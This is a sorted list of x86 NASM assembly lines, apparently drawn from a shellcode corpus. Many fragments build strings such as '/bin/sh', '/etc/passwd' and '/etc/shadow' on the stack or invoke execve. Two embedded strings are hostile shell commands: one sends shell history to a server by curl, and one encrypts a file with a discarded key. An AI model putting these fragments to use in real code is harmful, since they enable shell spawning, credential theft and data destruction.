+mov byte [esi + 1], dl
+mov byte [esi], bl
+mov byte [esi+11], al
+mov byte [esi+12], al
+mov byte [esi+14], al
+mov byte [esi+14],al
+mov byte [esi+17], al
+mov byte [esi+17],al
+mov byte [esi+21], al
+mov byte [esi+7], al
+mov byte [esp], 0x2e
+mov byte [esp], 0x2f
+mov byte [esp], 0x2f
+mov byte [esp], 0x7f
+mov byte [esp+2], 0x07
+mov byte [esp+3], 0x01
+mov byte [esp+3], 0x11
+mov byte [hexstr+edx+1],bl
+mov byte [hexstr+edx+2],al
+mov byte [var], 5
+mov byte al, 0x0b
+mov byte al, 0x3f
+mov byte al, 0x3f
+mov byte al, 0xa4
+mov byte al, 0xa4
+mov byte al, 11
+mov byte al, 83
+mov byte cl, 7
+mov cl, 077o
+mov cl, 0x1
+mov cl, 0x1e
+mov cl, 0x2
+mov cl, 0x2
+mov cl, 10 \n dec cl \n jnz l1
+mov cl, 100
+mov cl, 128
+mov cl, 13
+mov cl, 2
+mov cl, 21
+mov cl, 3
+mov cl, 30
+mov cl, 30
+mov cl, 32
+mov cl, 9
+mov cl, al
+mov cl, bl \n sub cl, 1 \n jnz loop
+mov cl, byte [eax]
+mov cl, byte [esi]
+mov cl, byte_table+2
+mov cl, shellcode_length
+mov cl, shellcodelen
+mov count, bx
+mov cx, [esi]
+mov cx, 01
+mov cx, 02001
+mov cx, 0666
+mov cx, 0700
+mov cx, 0x191
+mov cx, 0x1ff
+mov cx, 0x2bc
+mov cx, 0x301
+mov cx, 0x3b30
+mov cx, 0x401
+mov cx, 0x5309
+mov cx, 0x9ed
+mov cx, 0xfff
+mov cx, 2001
+mov cx, 2001Q
+mov cx, word_table + 3
+mov cx, word_table[3]
+mov dl, 0x02
+mov dl, 0x09
+mov dl, 0x1
+mov dl, 0x10
+mov dl, 0x14
+mov dl, 0x1c
+mov dl, 0x2
+mov dl, 0x7f
+mov dl, 0xc
+mov dl, 0xd
+mov dl, 1+0feh
+mov dl, 93
+mov dl, byte [eax + 1]
+mov dl, byte [eax]
+mov dl, byte [eax]
+mov dl, byte [esi + 1]
+mov dl, byte 0ffh
+mov dl, len
+mov dword [eax], var1
+mov dword [ebx], 2
+mov dword [ebx], 4
+mov dword [esi + 12], eax
+mov dword [esi + 8], ebx
+mov dword [esp-0x10], 0x5f657a69
+mov dword [esp-0x14], 0x6d6f646e
+mov dword [esp-0x18], 0x61722f6c
+mov dword [esp-0x1c], 0x656e7265
+mov dword [esp-0x20], 0x6b2f7379
+mov dword [esp-0x24], 0x732f636f
+mov dword [esp-0x28], 0x72702f2f
+mov dword [esp-0x4], eax
+mov dword [esp-0x8], 0x65636170
+mov dword [esp-0xc], 0x735f6176
+mov dword [esp-12], 0x6374652f
+mov dword [esp-12], 0x6374652f
+mov dword [esp-4], ecx
+mov dword [esp-4], esi
+mov dword [esp-4], esi
+mov dword [esp-4], esi
+mov dword [esp-8], 0x68732f2f
+mov dword [esp-8], 0x68732f2f
+mov dword [esp-8], edi
+mov dx, 0x1a4
+mov dx, 0x2a1
+mov dx, 0xb01
+mov dx, 1222
+mov dx, 132
+mov dx, 16666
+mov eax, _start
+mov eax, [ebp+8]
+mov eax, [ebx]
+mov eax, [ebx+8]
+mov eax, [ebx+epi*4+2]
+mov eax, [ebx+esi]
+mov eax, [ebx+esi*2+4]
+mov eax, [esi-4]
+mov eax, [esp]
+mov eax, [esp+4]
+mov eax, [temp]
+mov eax, [temp1]
+mov eax, [x]
+mov eax, [y]
+mov eax, [y]
+mov eax, [z]
+mov eax, 0ah
+mov eax, 0ah
+mov eax, 0ah
+mov eax, 0x2e323931
+mov eax, 0x2e383631
+mov eax, 0x2f3e20
+mov eax, 0x2f766564
+mov eax, 0x31263e32
+mov eax, 0x33392e31
+mov eax, 0x3f
+mov eax, 0x5
+mov eax, 0x50905090
+mov eax, 0x563ed8b7
+mov eax, 0x66
+mov eax, 0x6c6c756e
+mov eax, 0x782f2f
+mov eax, 0x8000
+mov eax, 0x8b90909d
+mov eax, 0x969d8cd0
+mov eax, 0x9a8dd091
+mov eax, 0xb33fb33f
+mov eax, 0xdeadc0de
+mov eax, 0xfeffff80
+mov eax, 0xffffffff
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 1
+mov eax, 10
+mov eax, 10
+mov eax, 10000h
+mov eax, 102
+mov eax, 106
+mov eax, 106
+mov eax, 106
+mov eax, 106
+mov eax, 106
+mov eax, 11
+mov eax, 11
+mov eax, 11
+mov eax, 11
+mov eax, 11
+mov eax, 11
+mov eax, 13
+mov eax, 132
+mov eax, 19
+mov eax, 19
+mov eax, 19
+mov eax, 19
+mov eax, 19
+mov eax, 19
+mov eax, 2
+mov eax, 2
+mov eax, 2
+mov eax, 2
+mov eax, 2
+mov eax, 2
+mov eax, 2
+mov eax, 20
+mov eax, 20
+mov eax, 20
+mov eax, 20
+mov eax, 20
+mov eax, 21
+mov eax, 27
+mov eax, 27
+mov eax, 27
+mov eax, 27
+mov eax, 27
+mov eax, 29
+mov eax, 29
+mov eax, 29
+mov eax, 29
+mov eax, 29
+mov eax, 3
+mov eax, 3
+mov eax, 3
+mov eax, 3
+mov eax, 3
+mov eax, 3
+mov eax, 3
+mov eax, 3
+mov eax, 37
+mov eax, 37
+mov eax, 37
+mov eax, 37
+mov eax, 37
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 4
+mov eax, 48
+mov eax, 48
+mov eax, 48
+mov eax, 48
+mov eax, 48
+mov eax, 5
+mov eax, 5
+mov eax, 5
+mov eax, 5
+mov eax, 5
+mov eax, 5
+mov eax, 6
+mov eax, 6
+mov eax, 6
+mov eax, 6
+mov eax, 6
+mov eax, 6
+mov eax, 63
+mov eax, 63
+mov eax, 63
+mov eax, 63
+mov eax, 63
+mov eax, 64
+mov eax, 64
+mov eax, 64
+mov eax, 64
+mov eax, 64
+mov eax, 65
+mov eax, 65
+mov eax, 65
+mov eax, 65
+mov eax, 65
+mov eax, 67
+mov eax, 67
+mov eax, 67
+mov eax, 67
+mov eax, 67
+mov eax, 7
+mov eax, 7
+mov eax, 7
+mov eax, 7
+mov eax, 7
+mov eax, 8
+mov eax, 90
+mov eax, 90
+mov eax, 90
+mov eax, 90
+mov eax, 90
+mov eax, 90
+mov eax, addr
+mov eax, array[esi*4]
+mov eax, b
+mov eax, buff
+mov eax, buffer
+mov eax, buzz
+mov eax, c
+mov eax, childmsg
+mov eax, ebx
+mov eax, ebx
+mov eax, ebx
+mov eax, ebx
+mov eax, ebx
+mov eax, ecx
+mov eax, ecx
+mov eax, edx
+mov eax, edx
+mov eax, esi
+mov eax, esp
+mov eax, esp
+mov eax, filecontents
+mov eax, fizz
+mov eax, key
+mov eax, m_src
+mov eax, msg
+mov eax, msg1
+mov eax, msg1
+mov eax, msg2
+mov eax, msg3
+mov eax, mxcsr
+mov eax, n_src
+mov eax, parentmsg
+mov eax, response
+mov eax, type var4
+mov ebp, buff
+mov ebp, eax
+mov ebp, ecx
+mov ebp, esp
+mov ebp, esp
+mov ebp, esp
+mov ebx, [ebp-4]
+mov ebx, [ebp-4]
+mov ebx, [ebp-8]
+mov ebx, [ebp-8]
+mov ebx, [esp]
+mov ebx, [my_table]
+mov ebx, [my_table]
+mov ebx, [temp2]
+mov ebx, [x]
+mov ebx, [y]
+mov ebx, 0
+mov ebx, 0
+mov ebx, 0
+mov ebx, 0
+mov ebx, 0
+mov ebx, 0
+mov ebx, 0x1
+mov ebx, 0x4
+mov ebx, 0x40000
+mov ebx, 0x5
+mov ebx, 0xfee1dead
+mov ebx, 1
+mov ebx, 1
+mov ebx, 1
+mov ebx, 1
+mov ebx, 1
+mov ebx, 1
+mov ebx, 10
+mov ebx, 2
+mov ebx, 2
+mov ebx, 3
+mov ebx, 3
+mov ebx, 3
+mov ebx, 4
+mov ebx, 5
+mov ebx, 5
+mov ebx, 9
+mov ebx, buff
+mov ebx, command
+mov ebx, dword 0x5090508f
+mov ebx, dword 0x50905091
+mov ebx, eax
+mov ebx, eax
+mov ebx, eax
+mov ebx, ecx
+mov ebx, ecx
+mov ebx, edi
+mov ebx, edx
+mov ebx, esi
+mov ebx, esp
+mov ebx, esp
+mov ebx, esp
+mov ebx, esp
+mov ebx, esp
+mov ebx, esp
+mov ebx, filename
+mov ebx, m_src1
+mov ebx, m_src2
+mov ebx, msg
+mov ebx, n
+mov ebx, name
+mov ebx, request
+mov ebx, sock_reg
+mov ebx, type var3
+mov ebx, upcase
+mov ebx, x
+mov ebx, zero_reg
+mov ecx, [ebp+12]
+mov ecx, [ebp+12]
+mov ecx, [esi+4*eax]
+mov ecx, [esp]
+mov ecx, [esp]
+mov ecx, [my_table]
+mov ecx, [temp3]
+mov ecx, [x]
+mov ecx, 0777
+mov ecx, 0x0
+mov ecx, 0x1
+mov ecx, 0x88998899
+mov ecx, 1
+mov ecx, 36
+mov ecx, 4294948047
+mov ecx, 672274793
+mov ecx, arguments
+mov ecx, array
+mov ecx, array2
+mov ecx, b
+mov ecx, buff
+mov ecx, buffer
+mov ecx, contents
+mov ecx, contents
+mov ecx, donemsg
+mov ecx, eatmsg
+mov ecx, eax
+mov ecx, edi
+mov ecx, edx
+mov ecx, edx
+mov ecx, edx
+mov ecx, esi
+mov ecx, esp
+mov ecx, esp
+mov ecx, esp
+mov ecx, esp
+mov ecx, esp
+mov ecx, esp
+mov ecx, esp
+mov ecx, filecontents
+mov ecx, hello
+mov ecx, hexstr
+mov ecx, m_src3
+mov ecx, msg
+mov ecx, msg
+mov ecx, msg
+mov ecx, offset array
+mov ecx, readbuffer
+mov ecx, request
+mov ecx, response
+mov ecx, rm
+mov ecx, rn
+mov ecx, type var2
+mov ecx, y
+mov edi, [ebp+16]
+mov edi, 0x343997b7
+mov edi, 0x978cd092
+mov edi, 0xada67373
+mov edi, 876189623
+mov edi, 884021143
+mov edi, eax
+mov edi, eax
+mov edi, ecx
+mov edi, edx
+mov edi, edx
+mov edi, esp
+mov edi, hexstr
+mov edx, [esi+4*ebx]
+mov edx, [esp]
+mov edx, [temp4]
+mov edx, [z]
+mov edx, 0x1234567
+mov edx, 1
+mov edx, 11
+mov edx, 12
+mov edx, 13
+mov edx, 2
+mov edx, 255
+mov edx, 3
+mov edx, 43
+mov edx, 43
+mov edx, 66729180
+mov edx, 78
+mov edx, 8
+mov edx, 8
+mov edx, 9
+mov edx, buff
+mov edx, bufflen
+mov edx, donelen
+mov edx, dword 0x65676760
+mov edx, dword 0x65676760
+mov edx, eatlen
+mov edx, eax
+mov edx, eax
+mov edx, ebp
+mov edx, ecx
+mov edx, ecx
+mov edx, environment
+mov edx, esi
+mov edx, esp
+mov edx, esp
+mov edx, esp
+mov edx, filename
+mov edx, hellolen
+mov edx, len
+mov edx, m_src4
+mov edx, n
+mov edx, readbuffer
+mov edx, readlen
+mov edx, response
+mov edx, src
+mov edx, tmp
+mov edx, type var1
+mov esi, [ebp+12]
+mov esi, 0x222933f0
+mov esi, 0x243525f0
+mov esi, 0x34399797
+mov esi, 0x353ffc3b
+mov esi, 0x563a1f3e
+mov esi, 0x65636170
+mov esi, 0x68732f2f
+mov esi, 0x72702f2f
+mov esi, 0x735f6176
+mov esi, 0x91969dd0
+mov esi, 0xd2c45e5e
+mov esi, 10
+mov esi, 9
+mov esi, buff
+mov esi, eax
+mov esi, eax
+mov esi, ecx
+mov esi, edx
+mov esi, esp
+mov esi, v
+mov esi, v_src
+mov esi, var
+mov esp, ebp
+mov esp, ebp
+mov long [esi+18], esi
+mov long [esi+22], ebx
+mov long [esi+22], esi
+mov long [esi+26], eax
+mov long [esi+26], ebx
+mov long [esi+30], eax
+mov sock_reg, eax
+mov total, 48
+mov word [ebx], 2
+mov word [esp+0x1], 0x776f
+mov x, eax
+move ecx, edx
+msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a
+msg db 'hello, world!', 0xa
+msg db 'i love you!', 0ah
+msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a
+msg db 'we found the egg!', 0ah, 0dh
+msg_len equ $-msg
+msg1 db 'hello, brave new world!', 0ah
+msg2 db 'passwd', 0x00
+msg2 db 'this is how we recycle in nasm.', 0ah
+msglength: equ 12
+mul [tmp]
+mul [value]
+mul [var]
+mul 0x10
+mul 25
+mul 3
+mul ebx
+mul ebx
+mul ebx
+mul ebx
+mul ebx
+mul ecx
+mul ecx
+mul ecx
+mul edx
+mul edx
+mul edx
+my_table times 10 dw 0
+my_table times 10 dw 0
+my_var dw 0abcdh
+myList word 1,2,3,4,5
+name db '/bin/sh', 0
+name db 30 dup
+neg eax
+neg eax
+neg eax
+neg ebx
+neg ecx
+neg edi
+neg edi
+neg edx
+neg var
+neg_number dw -12345
+negative:
+next_addr:
+next_addr:
+next_cycle:
+next_page:
+next:
+nop
+nop
+not ax
+not ax
+not byte [tmp]
+not byte [var]
+not byte [var2]
+not dl
+not eax
+not ecx
+not ecx
+not edi
+not edx
+not esi
+number dw 12345
+number: resb 1
+numbers dw 34, 45, 56, 67, 75, 89
+one:
+one:
+or al, bl
+or al, syscall_execve
+or cx, 0xfff
+or dx, 0xfff
+or eax, 0xffffffff
+output:
+path db '//bin/sh'
+path db '//bin/sh'
+path:
+pop [eax]
+pop [ebx]
+pop ax
+pop bx
+pop cx
+pop cx
+pop dx
+pop dx
+pop eax
+pop eax
+pop eax
+pop eax
+pop eax
+pop eax
+pop eax
+pop eax
+pop eax
+pop eax
+pop ebp
+pop ebp
+pop ebx
+pop ebx
+pop ebx
+pop ebx
+pop ebx
+pop ebx
+pop ecx
+pop ecx
+pop ecx
+pop ecx
+pop ecx
+pop ecx \n loop l1 \n mov eax, 1
+pop ecx \n loop l2 \n mov eax, 1
+pop ecx \n loop l3 \n mov eax, 1
+pop edi
+pop edi
+pop edx
+pop edx
+pop edx
+pop edx
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi
+pop esi \n mov dx, [esi]
+pop esp
+pop si
+popad
+popad
+popad
+port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
+port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
+prepare:
+priv_setgid:
+priv_setuid:
+process_shellcode:
+push _ip
+push '//pa'
+push '//sh'
+push '/bin'
+push '/etc'
+push 'sswd'
+push [tmp]
+push [var]
+push [var2]
+push 0bh
+push 0x0
+push 0x0
+push 0x04020a0a
+push 0x0a206873
+push 0x0a3a7964
+push 0x0a4c4c41
+push 0x0a4c4c41
+push 0x1
+push 0x1
+push 0x1
+push 0x10
+push 0x10
+push 0x10
+push 0x10
+push 0x16
+push 0x1a
+push 0x1a
+push 0x1c
+push 0x1c
+push 0x2
+push 0x2
+push 0x2
+push 0x203a4457
+push 0x203a4457
+push 0x204c4c41
+push 0x204c4c41
+push 0x2431243a
+push 0x29
+push 0x29
+push 0x2e312e31
+push 0x2e312e31
+push 0x2e323931
+push 0x2e323931
+push 0x2e373231
+push 0x2e373231
+push 0x2e383631
+push 0x2e383631
+push 0x2f2f2f2f
+push 0x2f2f2f2f
+push 0x2f2f2f2f
+push 0x2f2f2f2f \n mov eax, esp
+push 0x2f2f2f2f \n mov ebx, esp
+push 0x2f2f2f2f \n mov ecx, esp
+push 0x2f2f2f2f \n mov edi, esp
+push 0x2f2f2f2f \n mov edx, esp
+push 0x2f2f2f2f \n mov esi, esp
+push 0x2f2f2f6e
+push 0x2f3a706d
+push 0x2f3a746f
+push 0x2f656c2d
+push 0x2f656c2d
+push 0x2f6e6962
+push 0x2f6e6962
+push 0x30
+push 0x30313a31
+push 0x30313a31
+push 0x30317974
+push 0x30317974
+push 0x31313131
+push 0x3131313a
+push 0x31373737
+push 0x31373737
+push 0x3170762d
+push 0x3170762d
+push 0x3170762d
+push 0x32322e32
+push 0x32322e32
+push 0x3458652e
+push 0x37373333
+push 0x37373333
+push 0x37373333
+push 0x3a303a3a
+push 0x3a30754a
+push 0x3d4c4c41
+push 0x3d4c4c41
+push 0x3e0a7964
+push 0x4
+push 0x4
+push 0x45683933
+push 0x46
+push 0x4c4c4128
+push 0x4c4c4128
+push 0x4c5a304b
+push 0x4f4e2029
+push 0x4f4e2029
+push 0x5
+push 0x5
+push 0x50446862
+push 0x53534150
+push 0x53534150
+push 0x6
+push 0x6
+push 0x61622f2f
+push 0x61622f6e
+push 0x61655220
+push 0x6168732f
+push 0x6168732f
+push 0x6168732f
+push 0x6168732f \n push 0x6374652f \n mov ebx, esp
+push 0x61702f2f
+push 0x61702f2f \n push 0x6374652f \n mov eax, esp
+push 0x61702f2f \n push 0x6374652f \n mov ebx, esp
+push 0x61702f2f \n push 0x6374652f \n mov ecx, esp
+push 0x61702f2f \n push 0x6374652f \n mov edi, esp
+push 0x61702f2f \n push 0x6374652f \n mov edx, esp
+push 0x61702f2f \n push 0x6374652f \n mov esi, esp
+push 0x61702f63
+push 0x61702f63
+push 0x622f7273
+push 0x622f7273
+push 0x636e2f2f
+push 0x636e2f2f
+push 0x636e2f2f
+push 0x6374652f
+push 0x6374652f
+push 0x6374652f
+push 0x6374652f \n mov eax, esp
+push 0x6374652f \n mov ebp, esp
+push 0x6374652f \n mov ebx, esp
+push 0x6374652f \n mov ecx, esp
+push 0x6374652f \n mov edi, esp
+push 0x6374652f \n mov edx, esp
+push 0x6374652f \n mov esi, esp
+push 0x64687373
+push 0x64687373 \n mov eax, esp
+push 0x64687373 \n mov ebp, esp
+push 0x64687373 \n mov ebx, esp
+push 0x64687373 \n mov ecx, esp
+push 0x64687373 \n mov edi, esp
+push 0x64687373 \n mov edx, esp
+push 0x64687373 \n mov esi, esp
+push 0x6475732f
+push 0x6475732f
+push 0x6475732f
+push 0x6475732f \n push 0x6374652f \n mov eax, esp
+push 0x6475732f \n push 0x6374652f \n mov ebx, esp
+push 0x6475732f \n push 0x6374652f \n mov ecx, esp
+push 0x6475732f \n push 0x6374652f \n mov edi, esp
+push 0x6475732f \n push 0x6374652f \n mov edx, esp
+push 0x6475732f \n push 0x6374652f \n mov esi, esp
+push 0x64777373
+push 0x64777373
+push 0x6567772f
+push 0x6567772f
+push 0x656c6966
+push 0x656c6966
+push 0x65726f43
+push 0x65782e2f
+push 0x65782e2f
+push 0x66
+push 0x66
+push 0x66
+push 0x67513231
+push 0x6769666e
+push 0x682f2f2f
+push 0x682f2f2f
+push 0x68732f2f
+push 0x68732f2f
+push 0x68732f2f
+push 0x68732f2f
+push 0x68732f2f
+push 0x68732f2f
+push 0x68732f2f
+push 0x68732f2f \n push 0x6e69622f \n mov eax, esp
+push 0x68732f2f \n push 0x6e69622f \n mov eax, esp
+push 0x68732f2f \n push 0x6e69622f \n mov eax, esp
+push 0x68732f2f \n push 0x6e69622f \n mov eax, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov edx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov edx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov edx, esp
+push 0x68732f2f \n push 0x6e69622f \n mov edx, esp
+push 0x68732f6e
+push 0x68732f6e
+push 0x68732f6e
+push 0x68735858
+push 0x68736162
+push 0x68736162
+push 0x68736164
+push 0x68736164
+push 0x6873732f
+push 0x6873732f \n push 0x6374652f \n mov eax, esp
+push 0x6873732f \n push 0x6374652f \n mov ebx, esp
+push 0x6873732f \n push 0x6374652f \n mov ecx, esp
+push 0x6873732f \n push 0x6374652f \n mov edi, esp
+push 0x6873732f \n push 0x6374652f \n mov edx, esp
+push 0x6873732f \n push 0x6374652f \n mov esi, esp
+push 0x68737a2f
+push 0x69616863
+push 0x69622f2f
+push 0x69622f2f
+push 0x69622f2f
+push 0x69622f2f \n mov eax, esp
+push 0x69622f2f \n mov ebx, esp
+push 0x69622f2f \n mov ecx, esp
+push 0x69622f2f \n mov edx, esp
+push 0x69622f3a
+push 0x69622f65
+push 0x69622f65
+push 0x69622f65
+push 0x6962732f
+push 0x6962732f
+push 0x6c626174
+push 0x6d722f2f
+push 0x6d726574
+push 0x6d726574
+push 0x6e
+push 0x6e69622f
+push 0x6e69622f
+push 0x6e69622f
+push 0x6e69622f
+push 0x6e69622f
+push 0x6e69622f
+push 0x6e69622f \n push 0x7273752f \n mov eax, esp
+push 0x6e69622f \n push 0x7273752f \n mov ebx, esp
+push 0x6e69622f \n push 0x7273752f \n mov ecx, esp
+push 0x6e69622f \n push 0x7273752f \n mov edx, esp
+push 0x6e776f64
+push 0x6e7a762d
+push 0x6e7a762d \n mov ebp, esp
+push 0x6e7a762d \n mov ebx, esp
+push 0x6e7a762d \n mov edi, esp
+push 0x6e7a762d \n mov esi, esp
+push 0x6f635f64
+push 0x6f723a30
+push 0x7 \n mov edx, esp
+push 0x70692f6e
+push 0x70692f6e
+push 0x706d742f
+push 0x706d742f
+push 0x706d742f
+push 0x7268732f
+push 0x72706475
+push 0x7273752f
+push 0x7273752f
+push 0x7361702f
+push 0x7361702f
+push 0x73644d24
+push 0x7369642d
+push 0x7369642d
+push 0x7372656f
+push 0x7372656f
+push 0x7372656f
+push 0x7374736f
+push 0x7374736f
+push 0x74
+push 0x74
+push 0x742f2f2f
+push 0x742f2f2f
+push 0x742f3a31
+push 0x74303072
+push 0x7461632f \n push 0x6e69622f \n mov eax, esp
+push 0x7461632f \n push 0x6e69622f \n mov ebx, esp
+push 0x7461632f \n push 0x6e69622f \n mov ecx, esp
+push 0x7461632f \n push 0x6e69622f \n mov edi, esp
+push 0x7461632f \n push 0x6e69622f \n mov edx, esp
+push 0x7461632f \n push 0x6e69622f \n mov esi, esp
+push 0x74652f2f
+push 0x74652f2f
+push 0x746f6f72
+push 0x74756873
+push 0x74756f2f
+push 0x74756f2f
+push 0x752f2f2f
+push 0x752f2f2f
+push 0x7665642f
+push 0x7665642f
+push 0x76766c2d
+push 0x76766c2d
+push 0x76766c2d
+push 0x78
+push 0x78
+push 0x78
+push 0x782f2f32
+push 0x782f2f32
+push 0x782f6e69
+push 0x782f6e69
+push 0x78534a52
+push 0x79616c70
+push 0x79616c70
+push 0x8
+push 0x81e3a8c0
+push 0x8501a8c0
+push 0xa
+push 0xa
+push 0xa01a8c0
+push 0xb
+push 0xb
+push 0xdebf
+push 0xefffff7f
+push 0xf
+push 1
+push 1
+push 10
+push 10 \n mov eax, esp
+push 102
+push 12 \n mov ebx, esp
+push 15 \n mov ecx, esp
+push 16
+push 2
+push 20
+push 20
+push 216
+push 6
+push ax
+push ax
+push ax
+push bx
+push bx
+push bx
+push byte -1
+push byte +0x1
+push byte +0x10
+push byte +0x2
+push byte +0x3
+push byte +0x46
+push byte +0x6
+push byte +0x66
+push byte +0x7f
+push byte +0x8
+push byte +0xb
+push byte 0
+push byte 0x0
+push byte 0x01
+push byte 0x01
+push byte 0x01 \n pop eax
+push byte 0x02
+push byte 0x02
+push byte 0x02 \n pop eax
+push byte 0x04
+push byte 0x04 \n pop eax
+push byte 0x05
+push byte 0x05 \n pop eax
+push byte 0x06
+push byte 0x06 \n pop eax
+push byte 0x0b
+push byte 0x0b \n pop eax
+push byte 0x1
+push byte 0x1
+push byte 0x1 \n mov ecx, esp
+push byte 0x10
+push byte 0x10 \n pop eax
+push byte 0x11 \n mov ebx, esp
+push byte 0x17
+push byte 0x17 \n pop eax
+push byte 0x1c
+push byte 0x1c \n pop eax
+push byte 0x1f
+push byte 0x1f \n pop eax
+push byte 0x2
+push byte 0x2
+push byte 0x2 \n mov ecx, esp
+push byte 0x2 \n pop eax
+push byte 0x2e
+push byte 0x2e \n pop eax
+push byte 0x2f
+push byte 0x2f \n pop eax
+push byte 0x3
+push byte 0x3 \n pop eax
+push byte 0x30
+push byte 0x30 \n pop eax
+push byte 0x3f
+push byte 0x3f \n pop eax
+push byte 0x4
+push byte 0x4 \n pop eax
+push byte 0x43
+push byte 0x43
+push byte 0x43
+push byte 0x43
+push byte 0x43 \n pop eax
+push byte 0x43 \n pop eax
+push byte 0x5 \n mov ebx, esp
+push byte 0x5 \n mov edx, esp
+push byte 0x64
+push byte 0x64
+push byte 0x64 \n pop eax
+push byte 0x66
+push byte 0x66 \n pop eax
+push byte 0x7 \n mov edx, esp
+push byte 0x77
+push byte 0x77
+push byte 0x77 \n pop eax
+push byte 0x8 \n mov edx, esp
+push byte 0xb
+push byte 0xb \n pop eax
+push byte 0xc
+push byte 0xc \n pop eax
+push byte 1
+push byte 1
+push byte 1
+push byte 1
+push byte 1 \n mov eax, esp
+push byte 1 \n pop eax
+push byte 10
+push byte 10
+push byte 10 \n pop eax
+push byte 11
+push byte 11
+push byte 11 \n pop eax
+push byte 15
+push byte 15
+push byte 15 \n pop eax
+push byte 16
+push byte 16
+push byte 16 \n pop eax
+push byte 17h
+push byte 17h \n pop eax
+push byte 2
+push byte 2
+push byte 2 \n pop eax
+push byte 25
+push byte 25 \n pop eax
+push byte 28
+push byte 28 \n pop eax
+push byte 3 \n mov ebx, esp
+push byte 37
+push byte 37 \n pop eax
+push byte 3h
+push byte 3h \n pop eax
+push byte 4
+push byte 4 \n pop eax
+push byte 49
+push byte 49 \n pop eax
+push byte 5
+push byte 5 \n pop eax
+push byte 54
+push byte 54 \n pop eax
+push byte 6
+push byte 6
+push byte 6
+push byte 6 \n pop eax
+push byte 67
+push byte 67 \n pop eax
+push byte 70
+push byte 70 \n pop eax
+push byte 8
+push byte 8 \n pop eax
+push byte 9
+push byte 9 \n pop eax
+push byte chmod_call
+push byte CHMOD_CALL \n pop eax
+push byte CHMOD_CALL \n pop eax
+push byte L1 \n pop eax
+push byte my_value \n pop eax
+push byte VALUE \n pop eax
+push cx
+push dword [ebp+16]
+push dword [edx+2]
+push dword [edx+2]
+push dword 0x00000000
+push dword 0x0101017f
+push dword 0x017aa8c0
+push dword 0x0501a8c0
+push dword 0x0a206873
+push dword 0x10
+push dword 0x2
+push dword 0x214c4f4c
+push dword 0x2335738c
+push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax, esp
+push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ebx, esp
+push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ecx, esp
+push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx, esp
+push dword 0x2f2f6e69
+push dword 0x2f2f6e69
+push dword 0x2f3a2f3a
+push dword 0x2f3a3a30
+push dword 0x2f6e6962
+push dword 0x303a3a31
+push dword 0x313a303a
+push dword 0x39396e2d \n mov ebp, esp
+push dword 0x39396e2d \n mov ebx, esp
+push dword 0x39396e2d \n mov edi, esp
+push dword 0x39396e2d \n mov esi, esp
+push dword 0x3a303a3a
+push dword 0x4227a28b
+push dword 0x45525649
+push dword 0x58494741
+push dword 0x5f657a69
+push dword 0x6164732f
+push dword 0x61702f2f
+push dword 0x61702f63
+push dword 0x61722f6c
+push dword 0x61747069
+push dword 0x61747069
+push dword 0x62732f2f
+push dword 0x62732f2f
+push dword 0x62732f2f \n mov ebx, esp
+push dword 0x6374652f
+push dword 0x64616568
+push dword 0x64777373
+push dword 0x656e7265
+push dword 0x68732f2f
+push dword 0x68732f63
+push dword 0x68732f6e
+push dword 0x69622f2f
+push dword 0x69622f3a
+push dword 0x6962732f
+push dword 0x6b2f7379
+push dword 0x6b6e756a
+push dword 0x6d6f646e
+push dword 0x6e69622f
+push dword 0x6e69922f
+push dword 0x6f702f6e
+push dword 0x6f726577
+push dword 0x7264632f
+push dword 0x72657355
+push dword 0x732f636f
+push dword 0x73656c62
+push dword 0x73656c62
+push dword 0x7461632f
+push dword 0x74652f2f
+push dword 0x74652f2f \n mov eax, esp
+push dword 0x74652f2f \n mov ebp, esp
+push dword 0x74652f2f \n mov ebx, esp
+push dword 0x74652f2f \n mov ecx, esp
+push dword 0x74652f2f \n mov edx, esp
+push dword 0x74652f2f \n mov esi, esp
+push dword 0x7665642f
+push dword 0x776f6461
+push dword 0x8140a8c0
+push dword eax
+push dword eax
+push dword ebx
+push dx
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax \n mov ebx, esp
+push eax \n mov ecx, esp
+push eax \n mov edx, esp
+push ebp
+push ebp
+push ebp
+push ebp
+push ebp
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx \n mov eax, esp
+push ebx \n mov ecx, esp
+push ebx \n mov edx, esp
+push ecx
+push ecx
+push ecx
+push ecx
+push ecx
+push ecx
+push ecx
+push ecx
+push ecx
+push edi
+push edi
+push edi
+push edi
+push edi
+push edi \n mov eax, esp
+push edi \n mov ebx, esp
+push edi \n mov ecx, esp
+push edi \n mov edx, esp
+push edx
+push edx
+push edx
+push edx
+push edx
+push edx
+push edx
+push edx \n mov eax, esp
+push edx \n mov ebx, esp
+push edx \n mov ecx, esp
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi \n mov eax, esp
+push esi \n mov ebx, esp
+push esi \n mov edx, esp
+push esp
+push esp
